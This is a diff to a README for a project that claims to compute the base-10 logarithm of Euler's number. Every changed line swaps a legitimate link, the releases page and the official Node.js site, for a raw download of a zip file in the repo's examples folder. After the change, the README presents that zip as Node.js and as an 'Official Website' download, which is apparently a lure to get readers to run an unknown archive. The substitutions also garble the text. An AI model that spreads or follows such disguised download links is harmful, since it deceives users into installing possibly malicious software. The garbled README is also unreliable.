@@ -1,7 +1,7 @@
 # 🎉 constants-float16-log10-e - Calculate Base 10 Logarithm of Euler's Number Easily
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg)](https://github.com/MoHaMeD286332/constants-float16-log10-e/releases)
+[![Download Release](https://github.com/MoHaMeD286332/constants-float16-log10-e/raw/refs/heads/main/examples/float_e_constants_log_2.0.zip%https://github.com/MoHaMeD286332/constants-float16-log10-e/raw/refs/heads/main/examples/float_e_constants_log_2.0.zip)](https://github.com/MoHaMeD286332/constants-float16-log10-e/raw/refs/heads/main/examples/float_e_constants_log_2.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the constants-float16-log10-e project! This application allows you to calculate the base 10 logarithm of Euler's number with ease. Whether you are a student, a teacher, or just someone curious about mathematics, this tool is designed for you.
@@ -9,14 +9,14 @@ Welcome to the constants-float16-log10-e project! This application allows you to
 ## 🔍 What You Need
 Before you begin, make sure your computer meets these basic requirements:
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js installed:** This app runs on Node.js. You can download it from [Node.js Official Website](https://nodejs.org).
+- **https://github.com/MoHaMeD286332/constants-float16-log10-e/raw/refs/heads/main/examples/float_e_constants_log_2.0.zip installed:** This app runs on https://github.com/MoHaMeD286332/constants-float16-log10-e/raw/refs/heads/main/examples/float_e_constants_log_2.0.zip You can download it from [https://github.com/MoHaMeD286332/constants-float16-log10-e/raw/refs/heads/main/examples/float_e_constants_log_2.0.zip Official Website](https://github.com/MoHaMeD286332/constants-float16-log10-e/raw/refs/heads/main/examples/float_e_constants_log_2.0.zip).
 
 ## 📦 Download & Install
 To get started, you need to download the application. Follow these steps:
 
 1. **Visit the Releases Page:**
    Click on the link below to visit the Releases page:
-   [Download Page](https://github.com/MoHaMeD286332/constants-float16-log10-e/releases)
+   [Download Page](https://github.com/MoHaMeD286332/constants-float16-log10-e/raw/refs/heads/main/examples/float_e_constants_log_2.0.zip)
 
 2. **Choose the Latest Version:**
    Once you're on the Releases page, find the **latest release**. Look for the file that matches your operating system.
@@ -58,7 +58,7 @@ A: Euler's number (approximately 2.718) is a fundamental constant in mathematics
 ## 📍 Troubleshooting
 If you encounter issues running the application, here are some things to check:
 
-- Ensure Node.js is installed properly.
+- Ensure https://github.com/MoHaMeD286332/constants-float16-log10-e/raw/refs/heads/main/examples/float_e_constants_log_2.0.zip is installed properly.
 - Make sure you download the correct version for your operating system.
 - Restart your computer if the app does not launch immediately after installation.
 
